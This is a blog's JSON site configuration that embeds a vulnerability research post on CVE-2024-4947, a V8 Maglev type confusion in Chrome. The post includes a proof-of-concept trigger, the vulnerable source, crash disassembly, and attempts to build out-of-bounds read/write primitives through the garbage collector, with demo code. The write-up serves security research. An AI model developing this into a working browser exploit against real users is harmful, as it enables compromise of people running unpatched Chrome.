{"singlePage": ["about"], "startSite": "", "filingNum": "", "onePageListNum": 15, "commentLabelColor": "#006b75", "yearColorList": ["#bc4c00", "#0969da", "#1f883d", "#A333D0"], "i18n": "CN", "themeMode": "manual", "dayTheme": "light", "nightTheme": "dark", "urlMode": "pinyin", "script": "", "style": "", "bottomText": "", "showPostSource": 1, "iconList": {"twitter": "M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"}, "UTC": 8, "rssSplit": "sentence", "exlink": {"twitter": "https://x.com/buptdsb"}, "title": "@buptdsb's Blog", "subTitle": "Frontend / Chromium / V8 / Devtools(TTD) / Networking(TCP/QUIC) / ?", "avatarUrl": "https://www.svgrepo.com/show/398339/smiling-face-with-open-mouth-and-cold-sweat.svg", "GMEEK_VERSION": "last", "postListJson": {"P2": {"htmlDir": "docs/post/CVE-2024-4947- v8 incorrect AccessInfo for module namespace object causes Maglev type confusion.html", "labels": ["v8", "itw", "Maglev", "GC"], "postTitle": "CVE-2024-4947: v8 incorrect AccessInfo for module namespace object causes Maglev type confusion", "postUrl": "post/CVE-2024-4947-%20v8%20incorrect%20AccessInfo%20for%20module%20namespace%20object%20causes%20Maglev%20type%20confusion.html", "postSourceUrl": "https://github.com/zckevin/blog/issues/2", "commentNum": 0, "wordCount": 15961, "description": "# Info\r\nhttps://chromereleases.googleblog.com/2024/05/stable-channel-update-for-desktop_15.html\r\n[TBD][340221135] High CVE-2024-4947: Type Confusion in V8. Reported by Vasily Berdnikov (@vaber_b) and Boris Larin (@oct0xor) of Kaspersky on 2024-05-13\r\nGoogle is aware that an exploit for CVE-2024-4947 exists in the wild.\r\n\r\nhttps://chromium-review.googlesource.com/c/v8/v8/+/5534518\r\n\r\ngit checkout 473318dfdb09464902c7633cad03b16431145800 -b CVE-2024-4947\r\n\r\nauthor: [@buptdsb](https://x.com/buptdsb), [@mistymntncop](https://x.com/mistymntncop) \r\n2024-05-19 09:07:47\r\n\r\n# PoC\r\n\r\n```22.mjs\r\n// run with: `/d8 --allow-natives-syntax --maglev --expose-gc --soft-abort --trace-deopt 22.mjs`\r\nimport * as ns from \"./22.mjs\";\r\n\r\nexport let c = 0;\r\n\r\nfunction to_fast(o) {\r\n  var dummy = {'unique':5};\r\n  dummy.__proto__ = o;                                                                                                                                                                                                                 \r\n  dummy.__proto__ = o; //OptimizeAsFastPrototype\r\n}\r\nto_fast(ns);\r\n\r\nfunction store(target, v) {\r\n  target.c = v;\r\n}\r\n\r\nfunction createObject() {\r\n  let a = {};\r\n  a.i1 = 1;\r\n  a.i2 = 1;\r\n  a.i3 = 1;\r\n  a.i4 = 1;\r\n  // -----------------\r\n  for (let i = 0; i < 8; i++) {\r\n    a[`p${i}`] = 1;\r\n  }\r\n  return a;\r\n}\r\n\r\nfunction init() {\r\n  let a = createObject();\r\n  a.__proto__ = ns;\r\n  // %DebugPrint(a);\r\n  return a;\r\n}\r\n\r\n(function() {\r\n  %PrepareFunctionForOptimization(store);\r\n  store(init(), 0);\r\n  \r\n  %OptimizeMaglevOnNextCall(store);\r\n  store(init(), 0);\r\n})();\r\n\r\nfunction confuse_properties_map(arg) {\r\n  store(arg, 0x1);\r\n}\r\n\r\nlet a = init();\r\nlet arr = [];\r\narr.push(1.1);\r\nlet arr2 = [{}];\r\nconfuse_properties_map(a);\r\n\r\ngc();\r\n\r\n// %DebugPrint(a);\r\n// %DebugPrint(arr);\r\n\r\na.p5 = 1024;\r\na.p7 = 1024;\r\n%DebugPrint(arr);\r\n\r\n// %SystemBreak();\r\n```\r\n![image](https://github.com/zckevin/blog/assets/666724/d27db6bb-e34f-4a27-8681-7f689bb1c5cf)\r\n\r\n# where bug happens\r\n## source code\r\n```\r\nPropertyAccessInfo AccessorAccessInfoHelper() {\r\n  ...\r\n  return PropertyAccessInfo::ModuleExport(zone, receiver_map,\r\n                                            cell_ref.value());\r\n}\r\n\r\n\r\nPropertyAccessInfo PropertyAccessInfo::ModuleExport(Zone* zone,\r\n                                                    MapRef receiver_map,\r\n                                                    CellRef cell) {\r\n  return PropertyAccessInfo(zone, kModuleExport, {} /* holder */,\r\n                            cell /* constant */, {} /* api_holder */,\r\n                            {} /* name */, {{receiver_map}, zone});\r\n}\r\n\r\n\r\nReduceResult MaglevGraphBuilder::TryBuildStoreField(...) {\r\n  ...\r\n  ValueNode* store_target;\r\n  if (field_index.is_inobject()) {    <--- false\r\n    store_target = receiver;\r\n  } else {\r\n    // The field is in the property array, first load it from there.\r\n    store_target = AddNewNode<LoadTaggedField>({receiver}, JSReceiver::kPropertiesOrHashOffset);\r\n  }\r\n...\r\n  if (field_representation.IsSmi()) {     <------ field_representation is `none` for a `kModuleExport` AccessInfo\r\n    ...\r\n  } else if (value->use_double_register()) {\r\n    ...\r\n  } else {\r\n    BuildStoreTaggedField(store_target, value, field_index.offset()); <---------- field index offset is 0\r\n  }\r\n\r\n}\r\n```\r\n## crash site\r\n```\r\n0x7fe1e00001d6   196  8b7803               movl rdi,[rax+0x3]                                                                                                                                                                 \r\n0x7fe1e00001d9   199  4903fe               REX.W addq rdi,r14                                                                                                                                                                          \r\n...\r\n0x7fe1e0000225   1e5  8947ff               movl [rdi-0x1],rax           <--- crash                                                                  \r\n```\r\n\r\n$rax is the receiver, [rax+0x3] is receiver\u2019s properties\r\n\r\n$r14 seems like to be the ptr compression cage base pointer?\r\n![image](https://github.com/zckevin/blog/assets/666724/98887842-3f31-48ed-9f58-31375e4dbb22)\r\n\r\n`properties` is a FixedArray, as the write offset is 0, we are writing to `FixedArray`\u2019s map, which lives in ReadOnlySpace:\r\n![image](https://github.com/zckevin/blog/assets/666724/824e7000-1a29-43ac-b768-d12099dc0ae6)\r\n![image](https://github.com/zckevin/blog/assets/666724/526a5952-7455-47a0-9626-394015c3eeab)\r\n\r\nNow we have a primitive: `mov [[object_addr + 4] + 0], rax`,\r\nwhich means we could write any integer into a jsobject\u2019s propertyarray\u2019s map field\r\n\r\n# Research timeline\r\n## Failed attempt 1: an oob write using hash value write\r\nAs we have a type confusion primitive, then i open the map.h layout, \r\nseems like the only field which could be used in a PropertyArray map is `instance_type`.\r\nOther fields are for JSObjects.\r\n\r\nFor maglev optimization to work, we MUST have a fast jsobject, \r\nFor a fast jsobject, it could be confused with a dict mode jsobject, which instance_type is dict.\r\n![image](https://github.com/zckevin/blog/assets/666724/fe5120c2-2448-4216-a5e2-8251605fd780)\r\n\r\n\r\nSo we start grep code with `IsPropertyArray()`:\r\n\r\nTry confuse a fast PropertyArray -> Dictionary, then set hash on this fast object,\r\nas the hash store position is different in these two types, we MAY write oob into another array\u2019s length field.\r\nAlthough the hash value is a random smi, in most times it\u2019s value is greater than 0, so it\u2019s ok to be an array\u2019s length.\r\n![image](https://github.com/zckevin/blog/assets/666724/4cff4269-0d60-4e52-ade9-a745369f4cf1)\r\n\r\n\r\nNow we have another primitive:\r\noob write any **smi value** into field index 4(the 5th element) of a propertyarray\r\n\r\n### failed code snippet 1\r\ndemo code using sandbox api:\r\n```\r\nlet memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));\r\n\r\nlet dict = {};\r\ndict.a = 1;\r\ndelete dict.a;\r\n\r\nlet dict_properties = memory.getUint32(Sandbox.getAddressOf(dict) + 4, true);\r\nlet dict_properties_map_addr = memory.getUint32(dict_properties - 1, true);\r\n\r\nlet foo = {};\r\nfoo.p1 = 1;\r\nfoo.p2 = 1;\r\nfoo.p3 = 1;\r\nfoo.p4 = 1;\r\nfoo.p5 = 1;\r\n%DebugPrint(foo);\r\n\r\nlet properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);\r\nmemory.setUint32(properties - 1, dict_properties_map_addr, true);\r\n\r\nconst ws = new WeakSet();\r\nws.add(foo);\r\n\r\n%SystemBreak();\r\n```\r\n\r\nThe fixedarray set aborts in `CodeStubAssembler::FixedArrayBoundsCheck()`, it\u2019s a CSA_CHECK, not DCHECK.\r\nCause we will load hash value and compare the value with kNoHashSentinel(int value 0) first,\r\nthe fixedarray load in CSA has bound check enabled by default. \r\n![image](https://github.com/zckevin/blog/assets/666724/ce6864c6-f6c1-4dfc-90d4-3d55cc009392)\r\n\r\n\r\n### create hash take 2\r\nFind that we could use map normalization to trigger hash creation:\r\n```\r\nfunction set_hash(arg) {\r\n    let sb = {a2222222221: 1, a2222222222 : 1};\r\n    sb.__proto__ = arg;\r\n    delete sb.a2222222222;\r\n}\r\nset_hash(obj);\r\n```\r\n![image](https://github.com/zckevin/blog/assets/666724/d816dea9-9d16-49fd-96cb-7358d9db5d78)\r\n\r\n\r\n### try to create 1-length PropertyArray\r\nThis hash value oob write is quite weak:\r\nwrite smi only, we can\u2019t change any map address to trigger confusion\r\ncause we are doing a CAS alike operation, the hash creation function\u2019s check part needs the field value to be 0 at first\r\nsince most propertyarrays has unused elements allocated, we could only write to the second field of the adjacent v8 object\r\nprototype_maps can have 1-length PropertyArray, but can't have transition-tree, so can't be optizmized by ML/TF\r\n![image](https://github.com/zckevin/blog/assets/666724/317b9b96-6204-43dd-a3da-c2bd6026ffa1)\r\n\r\n\r\nMost FixedArrays have a `empty_fixed_array()` alike objects in heap roots\r\n\r\n- Other objects like fixedarray:\r\n- Regex match info\r\n- feedback vector\r\n- ...\r\n\r\nSeems too internal to be controlled from user js\r\n\r\n## Failed attempt 2: using gc\r\nTwo objects are located adjacently after gc, \r\nif one propertyarray\u2019s length is shrinked, the jsarray\u2019s length is intact,\r\nthen we may trigger a oob read?\r\n\r\nDemo:\r\n```\r\nlet memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));\r\n\r\nlet foo = {};\r\nlet bar = {};\r\nfoo.p1 = 1;\r\nfoo.p2 = 1;\r\nfoo.p3 = 1;\r\nfoo.p4 = 1;\r\n// ---------\r\nfoo.p5 = 1;\r\nfoo.p6 = 1;\r\nfoo.p7 = 1;\r\nfoo.p8 = 1;\r\n\r\nbar.p1 = 1;\r\nbar.p2 = 1;\r\nbar.p3 = 1;\r\nbar.p4 = 1;\r\nbar.p5 = 1;\r\n\r\n%DebugPrint(foo);\r\n%DebugPrint(bar);\r\n\r\nproperties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);\r\nmemory.setUint32(properties - 1 + 4, 0x6, true);\r\n\r\n// %DebugPrint(foo.p8);\r\n\r\ngc();\r\n\r\n%DebugPrint(foo);\r\n%DebugPrint(bar);\r\n\r\nproperties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);\r\nmemory.setUint32(properties - 1 + 4, 0x12, true);\r\n\r\n%DebugPrint(foo.p8);\r\n\r\n%SystemBreak();\r\n```\r\n\r\nAs we can only override the propertyarray\u2019s map, not the propertyarray itself\r\nand the map of it has variable length(which is 0)\r\n\r\n## gc take 2\r\nWe could confuse a propertyarray\u2019s map -> heapnumber\u2019s map,\r\nthen trigger a gc, then the propertyarray\u2019s body would shrink and we have a oob read/write.\r\n\r\nSince most (internal) maps are copied from the snapshot blob into heap, and there addresses are fixed.\r\n(the addrs may differ in different chrome versions?)\r\n\r\n![image](https://github.com/zckevin/blog/assets/666724/a57124c9-9c8d-4ea4-aacf-27da912f25bd)\r\n\r\n\r\nwe could create a layout graph:\r\n```\r\n-------------\r\njsobject\u2019s properties map\r\nlength\r\n<body>\r\n-------------\r\njsarray map\r\nproperties ptr\r\nelements ptr\r\nlength            <- p5\r\n-------------\r\njsarray\u2019s elements map\r\nlength            <- p7\r\n<body>\r\n-------------\r\n```\r\n\r\nbefore gc:\r\n![image](https://github.com/zckevin/blog/assets/666724/adb52099-16d5-405f-813c-65d3e0688a09)\r\n\r\n\r\nafter gc:\r\n![image](https://github.com/zckevin/blog/assets/666724/11aebdc1-6174-427a-8c0a-2c6dcd0e3a45)\r\n\r\n## gc after PropertyArray type confused with a string\r\nAfter calling `confuse_properties_map(a)`, we have set properties map ptr into 0x2f0000000002 (smi value)\r\n\r\nThen in gc(), it would take the memory range from 0x2f0000000002-1 as a Map.\r\nOther fields are irrelevant except the `instance_type`, since that decides which apply function to call.\r\nIf it\u2019s not a valid type, the large switch loop would fall into default case and abort.\r\n\r\nAs the `instance_type` is 0 for now, it\u2019s `INTERNALIZED_TWO_BYTE_STRING_TYPE`, \r\nso we will call `CALL_APPLY(SeqTwoByteString)` to gc this object.\r\n\r\nFor SeqTwoByteString, the `IterateBody` is a no-op. GC just move the whole string range from one place\r\nto another.\r\n\r\nThe layout of a js string is: `map | raw_hash_field | int32 length | ...`\r\nSo the length of this string is 0x02, the whole length of the heapobject is 16(3 * 4 + 2 * 2),\r\nthen after gc, propertyarray would have 2 elements inside, other elements are dropped.\r\n\r\npic: <the map from 0x2f0000000002-1>\r\n![image](https://github.com/zckevin/blog/assets/666724/8bc8b4d7-8210-4e80-855a-2fcc76b448e7)\r\n\r\npic:\r\n<SeqTwoByteString, map / raw_hash_field / length / string body>\r\n<PropertyArray, map / length / element 0 / element 1>\r\n![image](https://github.com/zckevin/blog/assets/666724/7c36c2af-e6de-49f3-bd91-041520c94b17)\r\n\r\n\r\n```\r\ntemplate <typename ObjectVisitor>\r\nvoid HeapObject::IterateBodyFast(PtrComprCageBase cage_base, ObjectVisitor* v) {\r\n  Tagged<Map> m = map(cage_base);\r\n  IterateBodyFast(m, SizeFromMap(m), v);\r\n}\r\n\r\ntemplate <typename ObjectVisitor>\r\nvoid HeapObject::IterateBodyFast(Tagged<Map> map, int object_size,\r\n                                 ObjectVisitor* v) {\r\n  BodyDescriptorApply<CallIterateBody>(map->instance_type(), map, *this,\r\n                                       object_size, v);\r\n}\r\n\r\ntemplate <typename Op, typename... Args>\r\nauto BodyDescriptorApply(InstanceType type, Args&&... args) {\r\n  switch (type) {\r\n      case kSeqStringTag:\r\n          return CALL_APPLY(SeqOneByteString);\r\n    ...\r\n    default:\r\nUNREACHABLE();\t\r\n  }\r\n}\r\n\r\nclass SeqOneByteString::BodyDescriptor final : public DataOnlyBodyDescriptor {\r\n  ...\r\n}\r\n\r\nclass DataOnlyBodyDescriptor : public BodyDescriptorBase {\r\n public:\r\n  template <typename ObjectVisitor>\r\n  static inline void IterateBody(Tagged<Map> map, Tagged<HeapObject> obj,\r\n                                 int object_size, ObjectVisitor* v) {}      <-------- noop here\r\n};\r\n\r\ntemplate <class Visitor>\r\nvoid LiveObjectVisitor::VisitMarkedObjectsNoFail(PageMetadata* page,\r\n                                                 Visitor* visitor) {\r\n  for (auto [object, size] : LiveObjectRange(page)) {\r\n    const bool success = visitor->Visit(object, size);\r\n   }\r\n}\r\n\r\nbool LiveObjectRange::iterator::AdvanceToNextMarkedObject() {\r\n  ...\r\n        current_size_ = ALIGN_TO_ALLOCATION_ALIGNMENT(\r\n          current_object_->SizeFromMap(current_map_));\r\n}\r\n\r\nint HeapObject::SizeFromMap(Tagged<Map> map) const {\r\n  ...\r\n  if (instance_type == SEQ_TWO_BYTE_STRING_TYPE ||\r\n      instance_type == INTERNALIZED_TWO_BYTE_STRING_TYPE ||\r\n      instance_type == SHARED_SEQ_TWO_BYTE_STRING_TYPE) {\r\n    // Strings may get concurrently truncated, hence we have to access its\r\n    // length synchronized.\r\n    return SeqTwoByteString::SizeFor(\r\n        SeqTwoByteString::unchecked_cast(*this)->length(kAcquireLoad));\r\n  }\r\n}\r\n\r\nV8_INLINE constexpr int32_t SeqTwoByteString::SizeFor(int32_t length) {\r\n  return OBJECT_POINTER_ALIGN(SeqTwoByteString::DataSizeFor(length));\r\n}\r\n```\r\n\r\nStack trace for gc:\r\n```\r\n#0  v8::internal::CallIterateBody::apply<v8::internal::SeqOneByteString::BodyDescriptor, false, v8::internal::RecordMigratedSlotVisitor> (map=..., obj=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1506\r\n#1  0x00007f6ecd5be46e in v8::internal::BodyDescriptorApply<v8::internal::CallIterateBody, v8::internal::Tagged<v8::internal::Map>&, v8::internal::HeapObject&, int&, v8::internal::RecordMigratedSlotVisitor*&> (type=v8::internal::SEQ_ONE_BYTE_STRING_TYPE, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1165\r\n#2  0x00007f6ecd5be3b5 in v8::internal::HeapObject::IterateBodyFast<v8::internal::RecordMigratedSlotVisitor> (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1512\r\n#3  0x00007f6ecd5cf6e4 in v8::internal::HeapObject::IterateFast<v8::internal::RecordMigratedSlotVisitor> (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1479\r\n#4  0x00007f6ecd5cef02 in v8::internal::EvacuateVisitorBase::RawMigrateObject<(v8::internal::EvacuateVisitorBase::MigrationMode)0> (base=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1503\r\n#5  0x00007f6ecd5d0374 in v8::internal::EvacuateVisitorBase::MigrateObject (this=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1626\r\n#6  0x00007f6ecd5d0138 in v8::internal::EvacuateVisitorBase::TryEvacuateObject (this=0x5635fee63598, target_space=v8::internal::OLD_SPACE, object=..., size=20, target_object=0x7fff5e1922e0) at ../../src/heap/mark-compact.cc:1602\r\n#7  0x00007f6ecd5cea9f in v8::internal::EvacuateNewSpaceVisitor::Visit (this=0x5635fee63598, object=..., size=20) at ../../src/heap/mark-compact.cc:1669\r\n#8  0x00007f6ecd5b2761 in v8::internal::LiveObjectVisitor::VisitMarkedObjectsNoFail<v8::internal::EvacuateNewSpaceVisitor> (page=0x5635fee4fd40, visitor=0x5635fee63598) at ../../src/heap/mark-compact.cc:4235\r\n#9  0x00007f6ecd5901e4 in v8::internal::Evacuator::RawEvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4253\r\n#10 0x00007f6ecd58fe80 in v8::internal::Evacuator::EvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4162\r\n```\u3002", "top": 0, "createdAt": 1716102434, "style": "", "script": "", "ogImage": "https://www.svgrepo.com/show/398339/smiling-face-with-open-mouth-and-cold-sweat.svg", "createdDate": "2024-05-19", "dateLabelColor": "#bc4c00"}}, "singeListJson": {}, "labelColorDict": {"GC": "#2B1512", "itw": "#0C1657", "Maglev": "#B7521B", "Runtime": "#43C2F7", "Turbofan": "#C8B0A4", "v8": "#c2e0c6"}, "displayTitle": "@buptdsb's Blog", "faviconUrl": "https://www.svgrepo.com/show/398339/smiling-face-with-open-mouth-and-cold-sweat.svg", "ogImage": "https://www.svgrepo.com/show/398339/smiling-face-with-open-mouth-and-cold-sweat.svg", "homeUrl": "https://zckevin.github.io/blog", "prevUrl": "disabled", "nextUrl": "disabled"}